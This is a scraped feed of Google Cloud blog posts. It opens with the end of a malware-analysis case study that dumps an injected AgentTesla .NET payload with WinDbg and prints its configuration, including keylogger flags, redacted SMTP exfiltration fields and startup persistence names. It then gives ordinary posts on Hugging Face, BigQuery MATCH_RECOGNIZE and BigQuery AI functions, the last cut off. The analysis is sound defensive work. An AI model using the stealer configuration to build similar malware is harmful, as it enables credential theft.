-----\n       0 [       0] address [size] of Delay Import Directory\n    2008 [      48] address [size] of COR20 Header Directory\n\nSECTION HEADER #1\n   .text name\n   3B434 virtual size\n    2000 virtual address\n   3B600 size of raw data\n     200 file pointer to raw data\n----- SNIPPED -----\n\nSECTION HEADER #2\n   .rsrc name\n     546 virtual size\n   3E000 virtual address\n     600 size of raw data\n   3B800 file pointer to raw data\n----- SNIPPED -----\n\nSECTION HEADER #3\n  .reloc name\n       C virtual size\n   40000 virtual address\n     200 size of raw data\n   3BE00 file pointer to raw data\n----- SNIPPED -----</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The presence of a COR20 header directory (a pointer to the .NET header) indicates that this is a .NET executable.</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">The relative virtual addresses for the </span><code style=\"vertical-align: baseline;\">.text</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x2000</code><span style=\"vertical-align: baseline;\">), </span><code style=\"vertical-align: baseline;\">.rsrc</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x3E000</code><span style=\"vertical-align: baseline;\">), and </span><code style=\"vertical-align: baseline;\">.reloc</code><span style=\"vertical-align: baseline;\"> (</span><code style=\"vertical-align: baseline;\">0x40000</code><span style=\"vertical-align: baseline;\">) also align with the target addresses of the </span><code style=\"vertical-align: baseline;\">WriteProcessMemory</code><span style=\"vertical-align: baseline;\"> calls.</span></p>\n<p><span style=\"vertical-align: baseline;\">The newly discovered PE file can now be extracted from memory using the </span><a href=\"https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-writemem--write-memory-to-file-\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">writemem</code></a><span style=\"vertical-align: baseline;\"> command.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>0:000&gt; .writemem c:\\users\\flare\\Desktop\\headers.bin 0x9810af0 L0x200\nWriting 200 bytes.\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\text.bin 0x984cb10 L0x3b600\nWriting 3b600 bytes.......................................................................................................................\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\rsrc.bin 0x387d9d0 L0x600\nWriting 600 bytes.\n\n0:000&gt; .writemem c:\\users\\flare\\Desktop\\reloc.bin 0x3927178 L0x200\nWriting 200 bytes.</code></pre></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Using a hex editor, the file can be reconstructed by placing each section at its raw offset. A quick analysis of the resulting .NET executable (SHA256: </span><a href=\"https://www.virustotal.com/gui/file/4dfe67a8f1751ce0c29f7f44295e6028ad83bb8b3a7e85f84d6e251a0d7e3076\" rel=\"noopener\" target=\"_blank\"><code style=\"text-decoration: underline; vertical-align: baseline;\">4dfe67a8f1751ce0c29f7f44295e6028ad83bb8b3a7e85f84d6e251a0d7e3076</code></a><span style=\"vertical-align: baseline;\">)</span><span style=\"vertical-align: baseline;\"> in dnSpy reveals its configuration data.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>----- SNIPPED -----\n\n// Token: 0x0400000E RID: 14\npublic static bool EnableKeylogger = Convert.ToBoolean(\"false\");\n// Token: 0x0400000F RID: 15\npublic static bool EnableScreenLogger = Convert.ToBoolean(\"false\");\n// Token: 0x04000010 RID: 16\npublic static bool EnableClipboardLogger = Convert.ToBoolean(\"false\");\n// Token: 0x0400001C RID: 28\npublic static string SmtpServer = \"&lt;REDACTED\";\n// Token: 0x0400001D RID: 29\npublic static string SmtpSender = \"&lt;REDACTED&gt;\";\n// Token: 0x04000025 RID: 37\npublic static string StartupDirectoryName = \"eXCXES\";\n// Token: 0x04000026 RID: 38\npublic static string StartupInstallationName = \"eXCXES.exe\";\n// Token: 0x04000027 RID: 39\npublic static string StartupRegName = \"eXCXES\";\n----- SNIPPED -----</code></pre></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Conclusion: TTD as an Analysis Accelerator</span></h3>\n<p><span style=\"vertical-align: baseline;\">This case study demonstrates the benefit of treating TTD execution traces as a searchable database. By capturing the payload delivery and directly querying the Debugger Data Model for specific API calls, we quickly bypassed the multi-layered obfuscation of the .NET dropper. The combination of targeted data model queries and LINQ filters (for </span><code style=\"vertical-align: baseline;\">CreateProcess*</code><span style=\"vertical-align: baseline;\"> and </span><code style=\"vertical-align: baseline;\">WriteProcessMemory*</code><span style=\"vertical-align: baseline;\">) and low-level commands (</span><code style=\"vertical-align: baseline;\">!dh</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">.writemem</code><span style=\"vertical-align: baseline;\">) allowed us to isolate and extract the hidden AgentTesla payload, yielding critical configuration details in a matter of minutes.</span></p>\n<p><span style=\"vertical-align: baseline;\">The tools and environment used in this analysis—including the latest version of WinDbg and TTD—are readily available via the </span><a href=\"https://github.com/mandiant/flare-vm\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">FLARE-VM</span></a><span style=\"vertical-align: baseline;\"> installation script. We encourage you to streamline your analysis workflow with  this pre-configured environment.</span></p>\n<p><span style=\"vertical-align: baseline;\">The TTD trace can be </span><a href=\"https://www.virustotal.com/gui/file/8610982c012f64dbf059e20ce67a625cf0cd99a307ded41b754f1e4d80ee8e94\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">downloaded from VirusTotal</span></a><span style=\"vertical-align: baseline;\"> along with the original </span><a href=\"https://www.virustotal.com/gui/file/b7268f9814ddac66d6a4c1c43115d19de4fdb23e4d30ae233aeb51127213a1df\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sample</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/expanding-support-for-ai-developers-on-hugging-face/",
        "title": "Expanding support for AI developers on Hugging Face",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Hugging-Face-Faster-Collab-Hero.max-600x600.png",
        "author": "Ryan J. Salva",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For those building with AI, most are in it to change the world — not twiddle their thumbs.</span><span style=\"vertical-align: baseline;\"> So when inspiration strikes, the last thing anyone wants is to spend hours waiting for the latest AI models to download to their development environment.</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">That’s why today we’re announcing a deeper partnership between </span><a href=\"https://huggingface.co/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hugging Face</span></a><span style=\"vertical-align: baseline;\"> and Google Cloud that:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">reduces Hugging Face model download times through Vertex AI and Google Kubernetes Engine</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">offers native support for TPUs on all open models sourced through Hugging Face</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">provides a safer experience through Google Cloud’s built-in security capabilities.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We’ll enable faster download times through a new gateway for Hugging Face repositories that will cache Hugging Face models and datasets directly on Google Cloud. Moving forward, developers working with Hugging Face’s open models on Google Cloud should expect download times to take minutes, not hours.</span></p>\n<p><span style=\"vertical-align: baseline;\">We’re also working with Hugging Face to add native support for </span><a href=\"https://cloud.google.com/tpu?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">TPUs</span></a><span style=\"vertical-align: baseline;\"> for all open models on the Hugging Face platform. This means that whether developers choose to deploy training and inference workloads on </span><a href=\"https://cloud.google.com/gpu?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">NVIDIA GPUs</span></a><span style=\"vertical-align: baseline;\"> or on TPUs, they’ll experience the same ease of deployment and support. </span></p>\n<p><span style=\"vertical-align: baseline;\">Open models are gaining traction with enterprise developers, who typically work with specific security requirements. To support enterprise developers, we’re working with Hugging Face to bring Google Cloud’s extensive security protocols to all Hugging Face models deployed through Vertex AI. This means that any Hugging Face model on </span><a href=\"https://cloud.google.com/model-garden?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Model Garden</span></a><span style=\"vertical-align: baseline;\"> will now be scanned and validated with Google Cloud’s leading cybersecurity capabilities powered by our </span><a href=\"https://cloud.google.com/security/products/threat-intelligence?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Threat Intelligence platform</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.mandiant.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">A more open AI</span></h3>\n<p><span style=\"vertical-align: baseline;\">Ultimately, we’re committed — through our </span><a href=\"https://cloud.google.com/blog/topics/partners/best-agentic-ecosystem-helping-partners-build-ai-agents-next25\"><span style=\"text-decoration: underline; vertical-align: baseline;\">robust and diverse AI ecosystem</span></a><span style=\"vertical-align: baseline;\"> — to supporting developers with class-leading AI tools, a choice of </span><a href=\"https://cloud.google.com/ai-infrastructure?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI-optimized infrastructur</span></a><span style=\"vertical-align: baseline;\">e, and a selection of </span><a href=\"https://cloud.google.com/model-garden?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">models in the hundreds</span></a><span style=\"vertical-align: baseline;\">; this includes a broad set of </span><a href=\"https://cloud.google.com/use-cases/open-source-ai?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">open models</span></a><span style=\"vertical-align: baseline;\"> optimized to run Google Cloud through Hugging Face.</span></p>\n<p><span style=\"vertical-align: baseline;\">This expanded partnership with Hugging Face furthers that commitment and will ensure that developers have an optimal experience when serving AI models on Google Cloud, whether they choose a model from Google, from our many partners, or one of the thousands of open models available on Hugging Face.</span></p>\n<p><span style=\"vertical-align: baseline;\">You can read more on </span><a href=\"https://huggingface.co/blog/google-cloud\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Hugging Face’s blog</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-11-13 14:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/introducing-match_recognize-in-bigquery/",
        "title": "Do you detect a pattern? BigQuery’s new MATCH_RECOGNIZE function can!",
        "thumbnail": null,
        "author": "Sarah Kwon",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Identifying patterns and sequences within your data is crucial for gaining deeper insights. Whether you're tracking user behavior, analyzing financial transactions, or monitoring sensor data, the ability to recognize specific sequences of events can unlock a wealth of information and actionable insights. </span></p>\n<p><span style=\"vertical-align: baseline;\">Imagine you’re a marketer at an e-commerce company trying to identify your most valuable customers by their purchasing trajectory. You know that customers who start with small orders and progress to mid-range purchases will usually end up becoming high-value purchasers and your most loyal segment. Having to figure out the complex SQL to aggregate and join this data could be quite the challenging task.</span></p>\n<p><span style=\"vertical-align: baseline;\">That's why we're excited to introduce </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_clause\"><span style=\"text-decoration: underline; vertical-align: baseline;\">MATCH_RECOGNIZE</span></a><span style=\"vertical-align: baseline;\">, a new feature in BigQuery that allows you to perform complex pattern matching on your data directly within your SQL queries!</span></p>\n<h3><strong style=\"vertical-align: baseline;\">What is MATCH_RECOGNIZE?</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At its core, MATCH_RECOGNIZE is a tool built directly into GoogleSQL for identifying sequences of rows that match a specified pattern. It’s similar to using regular expressions, but instead of matching patterns in a string of text, you're matching patterns in a sequence of rows within your tables. This capability is especially powerful for analyzing time-series data or any dataset where the order of rows is important.</span></p>\n<p><span style=\"vertical-align: baseline;\">With MATCH_RECOGNIZE, you can express complex patterns and define custom logic to analyze them, all within a single SQL clause. This reduces the need for cumbersome self-joins or complex procedural logic. It also lessens your reliance on Python to process data and will look familiar to users who have experience with Teradata’s nPath or other external MATCH_RECOGNIZE workloads (like Snowflake, Azure, Flink, etc.).</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How it works</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The MATCH_RECOGNIZE clause is highly structured and consists of several key components that work together to define your pattern-matching logic:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_partition_by\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">PARTITION BY</strong></a><span style=\"vertical-align: baseline;\">: This clause divides your data into independent partitions, allowing you to perform pattern matching within each partition separately.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_order_by\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ORDER BY</strong></a><span style=\"vertical-align: baseline;\">: Within each partition, ORDER BY sorts the rows to establish the sequence in which the pattern will be evaluated.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_measures\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">MEASURES</strong></a><span style=\"vertical-align: baseline;\">: Here, you can define the columns that will be included in the output, often using aggregate functions to summarize the matched data.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_pattern\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">PATTERN</strong></a><span style=\"vertical-align: baseline;\">: This is the heart of the MATCH_RECOGNIZE clause, where you define the sequence of symbols that constitutes a match. You can use quantifiers like *, +, ?, and more to specify the number of occurrences for each symbol.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_define\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">DEFINE</strong></a><span style=\"vertical-align: baseline;\">: In this clause, you define the conditions that a row must meet to be classified as a particular symbol in your pattern.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Let's look at a simple example. From our fictional scenario above, imagine you have a table of sales data, and as a marketing analyst, you want to identify </span><span style=\"vertical-align: baseline;\">customer purchase patterns where their spending starts low, increases to a mid-range, and then reaches a high level. </span><span style=\"vertical-align: baseline;\">With MATCH_RECOGNIZE, you could write a query like this:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT *\\r\\nFROM\\r\\n  Example_Project.Example_Dataset.Sales\\r\\nMATCH_RECOGNIZE (\\r\\n  PARTITION BY customer\\r\\n  ORDER BY sale_date\\r\\n  MEASURES\\r\\n     MATCH_NUMBER() AS match_number,\\r\\n     ARRAY_AGG(STRUCT(MATCH_ROW_NUMBER() AS row, CLASSIFIER() AS symbol,   \\r\\n                      product_category)) AS sales\\r\\n  PATTERN (low+ mid+ high+)\\r\\n  DEFINE\\r\\n     low AS amount &lt; 50,\\r\\n     mid AS amount BETWEEN 50 AND 100,\\r\\n     high AS amount &gt; 100\\r\\n);&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1716610&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">In this example, we're partitioning the data by customer and ordering it by sale_date. The PATTERN clause specifies that we're looking for one or more “low” sales events, followed by one or more “mid” sales events, followed by one or more “high” sales events. The DEFINE clause then specifies the conditions for a sale to be considered \"low\", “mid”, or \"high\". The MEASURES clause decides how to summarize each match; here with </span><code style=\"vertical-align: baseline;\">match_number</code><span style=\"vertical-align: baseline;\"> we are indexing each match starting from 1 and creating a ‘sales’ array that will track every match in order.</span></p>\n<p><span style=\"vertical-align: baseline;\">Below are example matched customers: </span></p>\n<div align=\"center\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table style=\"width: 99.7389%;\"><colgroup><col style=\"width: 14.8248%;\" /><col style=\"width: 21.159%;\" /><col style=\"width: 14.9596%;\" /><col style=\"width: 18.7332%;\" /><col style=\"width: 30.3235%;\" /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">customer</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">match_number</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.row</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.symbol</strong></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><strong style=\"vertical-align: baseline;\">sales.product_category</strong></p>\n</td>\n</tr>\n<tr>\n<td rowspan=\"5\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Cust1</code></p>\n</td>\n<td rowspan=\"5\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Books</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">mid</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">4</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Electronics</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">5</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Electronics</code></p>\n</td>\n</tr>\n<tr>\n<td rowspan=\"3\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Cust2</code></p>\n</td>\n<td rowspan=\"3\" style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">1</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">low</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Software</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">2</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">mid</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Books</code></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">3</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">high</code></p>\n</td>\n<td style=\"vertical-align: top; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">Clothing</code></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p> </p>\n<p><span style=\"vertical-align: baseline;\">This data highlights some sales trends and could offer insights for a market analyst to strategize conversion of lower-spending customers to higher-value sales based on these trends.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Use cases for MATCH_RECOGNIZE</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The possibilities with MATCH_RECOGNIZE are vast. Here are just a few examples of how you can use this powerful feature:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Funnel analysis</strong><span style=\"vertical-align: baseline;\">: Track user journeys on your website or app to identify common paths and drop-off points. For example, you could define a pattern for a successful conversion funnel (e.g., view_product -&gt; add_to_cart -&gt; purchase) and analyze how many users complete it.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Fraud detection</strong><span style=\"vertical-align: baseline;\">: Identify suspicious patterns of transactions that might indicate fraudulent activity. For example, you could look for a pattern of multiple small transactions followed by a large one from a new account.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Financial analysis</strong><span style=\"vertical-align: baseline;\">: Analyze stock market data to identify trends and patterns, such as a \"W\" or \"V\" shaped recovery.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Log analysis</strong><span style=\"vertical-align: baseline;\">: Sift through application logs to find specific sequences of events that might indicate an error or a security threat.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Churn analysis</strong><span style=\"vertical-align: baseline;\">: Identify patterns in your data that lead to customer churn and find actionable insights to reduce churn and improve customer sentiment. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Network monitoring</strong><span style=\"vertical-align: baseline;\">: Identify a series of failed login attempts to track issues or potential threats.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Supply chain monitoring</strong><span style=\"vertical-align: baseline;\">: Flag delays in a sequence of shipment events.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Sports analytics</strong><span style=\"vertical-align: baseline;\">: Identify streaks or changes in output for different players / teams over games, such as winning or losing streaks, changes in starting lineups, etc.</span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Get started today</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Ready to start using MATCH_RECOGNIZE in your own queries? The feature is now available to all BigQuery users! To learn more and dive deeper into the syntax and advanced capabilities, check out the official </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax#match_recognize_clause\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://github.com/GoogleCloudPlatform/bigquery-utils/blob/master/notebooks/bigquery_match_recognize_demo.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">tutorial</span></a><span style=\"vertical-align: baseline;\"> available on Colab, BigQuery, and GitHub.</span></p>\n<p><span style=\"vertical-align: baseline;\">MATCH_RECOGNIZE opens up a whole new world of possibilities for sequential analysis in BigQuery, and we can't wait to see how you'll use it to unlock deeper insights from your data.</span></p></div>",
        "published_date": "2025-11-12 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/sql-reimagined-for-the-ai-era-with-bigquery-ai-functions/",
        "title": "Announcing BigQuery-managed AI functions for better SQL",
        "thumbnail": null,
        "author": "Vaibhav Sethi",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">For decades, SQL has been the universal language for data analysis, offering access to analytics on structured data. Large Language Models (LLMs) like Gemini now provide a path to get nuanced insights from unstructured data such as text, image and video. However, integrating LLMs into standard SQL flow requires data movement, at least some prompt and parameter tuning to optimize result quality. This is expensive to perform at scale, which keeps these capabilities out of reach for many data practitioners. </span></p>\n<p><strong style=\"vertical-align: baseline;\">Today, we are excited to announce the public preview of BigQuery-managed AI functions, a new set of capabilities that reimagine SQL for the AI era</strong><span style=\"vertical-align: baseline;\">. These functions — AI.IF, AI.CLASSIFY, and AI.SCORE — allow you to use generative AI for common analytical tasks directly within your SQL queries, no complex prompt tuning or new tools required. These functions have been optimized for their target use cases, and do not need you to choose models or tune their parameters. Further through intelligent optimizations on your provided prompt and query plans we keep the costs minimal.</span></p>\n<p><span style=\"vertical-align: baseline;\">With these new functions, you can perform sophisticated AI-driven analysis using familiar SQL operators:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Filter and join data based on semantic meaning using AI.IF in a WHERE or ON clause.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Categorize unstructured text or images using AI.CLASSIFY in a GROUP BY clause.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Rank rows based on natural language criteria using AI.SCORE in an ORDER BY clause.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_hzHgTuY.max-1000x1000.jpg\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Together, these functions allow answering new kinds of questions previously out of reach for SQL analytics, for example, companies to news articles which mention them even when an old or unofficial name is used.</span></p>\n<p><span style=\"vertical-align: baseline;\">Let's dive deeper into how each of these functions works.</span></p>\n<h2><strong style=\"vertical-align: baseline;\">Function deep dive</strong></h2>\n<h3><strong style=\"vertical-align: baseline;\">AI.IF: Semantic filtering and joining</strong></h3>\n<p><span style=\"vertical-align: baseline;\">With </span><a href=\"https://cloud.google.com/bigquery/docs/reference/standard-sql/bigqueryml-syntax-ai-if\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI.IF</span></a><span style=\"vertical-align: baseline;\">, you can filter or join data using conditions written in natural language. This is useful for tasks like identifying negative customer reviews, filtering images that have specific attributes, or finding relevant information in documents. BigQuery optimizes the query plan to reduce the number of calls to LLM by evaluating non-AI filters first. For example, the following query finds tech news articles from BBC that are related to Google.</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;SELECT title, body \\r\\nFROM bigquery-public-data.bbc_news.fulltext \\r\\nWHERE AI.IF((&quot;The news is related to Google, news: &quot;, body),   \\r\\n      \\t     connection_id =&gt; &quot;us.test_connection&quot;)\\r\\n      AND category = &quot;tech&quot; \\t-- Non-AI filter evaluated first&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe6c1732940&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">You can also use </span><span style=\"vertical-align: baseline;\">AI.IF()</span><span style=\"vertical-align: baseline;\"> for powerful semantic joins, such as performing entity resolution</span><strong style=\"vertical-align: baseline;\"> </strong><span 